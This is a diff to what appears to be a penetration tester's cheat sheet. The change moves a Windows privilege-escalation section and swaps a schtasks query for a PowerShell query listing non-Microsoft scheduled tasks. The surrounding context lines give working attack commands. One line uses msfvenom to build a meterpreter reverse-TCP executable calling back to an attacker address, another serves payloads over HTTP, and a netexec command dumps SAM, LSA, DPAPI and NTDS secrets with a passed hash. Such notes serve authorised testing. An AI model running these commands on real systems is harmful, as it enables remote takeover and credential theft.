@@ -466,6 +466,10 @@ stty rows <num> columns <num>
 reset
 
 ## Windows
+[*] Priviledge Escalation
+Get-ScheduledTask | Where-Object {($_.Author -notmatch "Microsoft")} | Select-Object TaskName, TaskPath, State, Author
+services.msc
+
 [*] Metasploit
 python3 -m http.server 80 -d ~/Downloads/upload
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=$MYIP LPORT=5555 -f exe -o msfshell86.exe; cp msfshell86.exe msfshell.exe
@@ -499,10 +503,6 @@ reload_all
 background
 sessions
 sessions -i 1
-
-[*] Priviledge Escalation
-schtasks /query /fo LIST /v
-services.msc
 
 [*] Hash Dumping
 nxc smb $TARGET -u '$USERNAME' -H '$HASH' --sam --lsa --dpapi --ntds --local-auth
